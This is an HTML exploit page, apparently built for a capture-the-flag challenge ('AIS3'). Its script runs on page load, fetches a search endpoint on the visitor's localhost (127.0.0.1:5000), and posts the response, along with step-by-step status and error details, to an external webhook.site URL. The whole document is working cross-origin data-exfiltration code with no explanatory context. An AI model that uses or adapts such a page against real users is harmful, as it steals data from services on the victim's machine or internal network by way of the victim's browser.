<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Exploit Page</title>
</head>
<body>
    <p>Attempting to exfiltrate data... Check your webhook.</p>
    <script>
        const WEBHOOK_URL = "https://webhook.site/eed6e086-4677-4691-8515-ecf1b5559f63";
        const targetSearchURL = "http://127.0.0.1:5000/search?q=AIS3";

        async function sendToWebhook(label, data) {
            const payload = {
                timestamp: new Date().toISOString(),
                label: label,
                data: data
            };
            console.log(`Sending to webhook [${label}]:`, payload);
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    mode: 'cors'
                });
                console.log(`Successfully sent [${label}] to webhook.`);
            } catch (e) {
                console.error(`CRITICAL: Failed to send [${label}] to webhook:`, e);
                // Try a simple GET request if POST fails, to get *some* error signal out
                fetch(`${WEBHOOK_URL}?error_sending_label=${encodeURIComponent(label)}&error_msg=${encodeURIComponent(e.message)}`);
            }
        }

        async function runExploit() {
            await sendToWebhook("exploit_started", { message: "Exploit.html loaded and script started." });

            try {
                await sendToWebhook("before_fetch_search", { url: targetSearchURL });
                const response = await fetch(targetSearchURL); // No mode: 'no-cors' here, we need to read the response
                
                await sendToWebhook("after_fetch_search", { 
                    url: targetSearchURL, 
                    ok: response.ok, 
                    status: response.status,
                    type: response.type // 'basic', 'cors', 'error', 'opaque', 'opaqueredirect'
                });

                if (!response.ok) {
                    // Try to get text even if not ok, might contain clues (though CORS might prevent this)
                    let errorText = "Could not read error response text (possibly due to CORS).";
                    try {
                        errorText = await response.text();
                    } catch (e) {
                        // Ignore, already have a default
                    }
                    await sendToWebhook("fetch_search_not_ok", { 
                        status: response.status, 
                        responseText: errorText 
                    });
                    throw new Error(`HTTP error ${response.status} when fetching ${targetSearchURL}. Response type: ${response.type}. Text: ${errorText}`);
                }
                
                // If response.type is 'opaque', .json() will fail. This happens with 'no-cors' mode
                // or if CORS headers are missing and the browser restricts access.
                if (response.type === 'opaque') {
                    await sendToWebhook("fetch_search_opaque_response", { message: "Response was opaque, cannot read body due to CORS."});
                    throw new Error("Opaque response received, likely CORS issue preventing reading the body.");
                }

                await sendToWebhook("before_response_json", { message: "Attempting to parse JSON from search response." });
                const responseData = await response.json();
                await sendToWebhook("exploit_success", { searchResult: responseData });

            } catch (error) {
                console.error("Exploit caught an error:", error);
                await sendToWebhook("exploit_error", {
                    errorName: error.name,
                    errorMessage: error.message,
                    errorStack: error.stack, // Stack might be long
                    errorString: String(error)
                });
            }
            await sendToWebhook("exploit_finished", { message: "Exploit script finished execution." });
        }

        runExploit();
    </script>
</body>
</html>
